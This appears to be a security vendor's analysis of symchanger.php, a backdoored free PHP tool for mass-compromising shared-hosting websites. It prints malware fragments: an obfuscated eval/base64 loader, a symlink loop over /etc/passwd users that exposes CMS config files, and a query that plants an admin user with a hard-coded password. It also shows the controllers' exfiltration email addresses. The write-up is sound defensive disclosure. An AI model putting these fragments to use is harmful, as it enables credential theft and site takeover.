They do this by\noffering free malware, even going to great lengths to include a guide on how to use it. This\nmay sound like an excellent deal to unsuspecting users, but people downloading these free\ntools might be unaware that the malware itself is backdoored.\n\n## Mass Compromise Tool: symchanger.php\n\nThis mass compromise tool, a PHP file named symchanger.php, was found promoted on a\nFacebook group along with a link to its tutorial video.\n\nIt’s essentially just PHP code taken from existing malware with some backdoors added by\nthe attacker, who offers it for “free.”\n\n\n-----\n\n### Obfuscation Techniques\n\nWhen you open the downloaded malicious PHP file, you can immediately tell that the code is\nobfuscated:\n```\n<?php /*** PHP Encode v1.0 by zeura[dot]com ***/\n$XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode(\"aWYoIWZ1bmN0aW9uX2V4aXN0cygiW\n...\n\n```\nThe obfuscation uses a few different layers and file code checks during the execution, so it’s\nnot as easy to deobfuscate as text that is just encoded and compressed (e.g\n_gzinflate(base64_decode()._\n\nAfter deobfuscating the code, we see that the name symchanger.php is fitting for this\n[malware. It uses the popular symlink method to quickly cross-contaminate websites that are](https://blog.sucuri.net/2013/05/from-a-site-compromise-to-full-root-access-symlinks-to-root-part-i.html)\nhosted under the same user as the compromised website.\n\nTo accomplish cross-contamination, the tool searches for known configuration file names (in\nthis case WordPress, Joomla, Drupal, and WHMCS). If one is detected, a symlink to a .txt file\nis generated. The txt file extension is used so that the file can be downloaded — instead of\nrun — as a PHP file.\n\n\n-----\n\nIf the malware can access to /etc/passwd (some hosts limit it), then it will read the file\ncontents to get a list of all existing users on the web server. From there, it just performs a\n**[foreach loop to go through all of the users and obtain their credentials.](https://www.php.net/manual/en/control-structures.foreach.php)**\n```\n... \n          \"whm/configuration.php\",\n          \"drupal/sites/default/settings.php\",\n          \"drupal7/sites/default/settings.php\",\n          \"sites/default/settings.php\"\n        );\n        foreach ($dir as $users) {\n          $user = explode(\":\", $users);\n          foreach ($list as $confurl) {\n            symlink(\"/home/\" . $user[0] . \"/public_html/\" . $confurl,\n$user[0] . \"~\" . $confurl . \".txt\");\n            symlink(\"/home1/\" . $user[0] . \"/public_html/\" . $confurl,\n$user[0] . \"~\" . $confurl . \".txt\");\n            symlink(\"/home2/\" . $user[0] . \"/public_html/\" . $confurl,\n$user[0] . \"~\" . $confurl . \".txt\");\n\n```\nOnce it has established the symlinks to the associated configuration files, the malware reads\nthe SQL connection information and connects to the database, inserting a malicious admin\nuser into any individual databases it can successfully connect to:\n```\n$query2 = mysqli_query($connect, \"update \" . $prefix . \"users set\nuser_login='Admin',user_pass='c7433bf0630d8def04ad22c9f5308783'\");\nif ($query2)\n{\n  $_total_done++;\n  echo \"$siteeurl|Admin|Beast3x@8*#4@!<br>\";\n\n```\nIn the promotional video for this symchanger.php malware, the distributor shows the\nperspective of the attacker, loading the symchanger.php file on the compromised website.\n\nWhen the script finishes, results are displayed for website login page URLs that had\nmalicious admin users added, clearly displaying the efficacy of the cross-contamination\nfeature:\n\n\n-----\n\n## Phone Home Emails\n\nIf an unsuspecting user doesn’t deobfuscate and read the malware’s PHP code, it simply\nappears that this malware only benefits the user that runs it.\n\nWhat is less apparent, however, is that the PHP script also silently uses the compromised\nweb server to send out five separate emails to multiple email addresses. The contents of\nthese emails contain sensitive data, including the URL to the symchanger.php file that was\nrun, the directory listing, stolen credentials, and more.\n```\n #exim -bp\n 0m 2.1K 1jy3is-001yEF-1W <www-data@localhost.localdomain>\n     220r155@gmail.com\n 0m 2.1K 1jy3is-001yEI-76 <www-data@localhost.localdomain>\n     inurlbuy@gmail.com\n 0m 2.1K 1jy3is-001yEL-Ch <www-data@localhost.localdomain>\n     info.0@list.ru\n 0m  551 1jy3is-001yEO-IH <www-data@localhost.localdomain>\n     sad.saeed100@gmail.com\n\n```\n_The multiple emails in queue before sending out to the backdoor controllers_\n\nThis conveniently provides email recipients with unauthorized access to websites that were\ncompromised with the symchanger.php tool — and significantly reduces the amount of\nheavy lifting on their end. Instead of hacking a website, all the email recipient needs to do is\n\n\n-----\n\ncheck their email address and wait for the stolen information to roll in from others using the\nmass compromise tool.\n\n## Conclusion\n\nThe lure of free software is often enough for many users to disregard security risks and\n[willingly run code from dubious origins, making this trojan horse-style tactic popular with bad](https://en.wikipedia.org/wiki/Trojan_horse_(computing))\nactors.\n\nThankfully, our monitoring tools are able to detect and clean the mass infection malware that\n**symchanger.php is based on, but we suggest reading up on how to prevent cross site**\n[contamination in the first place — and follow website security best practices to mitigate risk.](https://sucuri.net/guides/website-security/)\n\n\n-----",
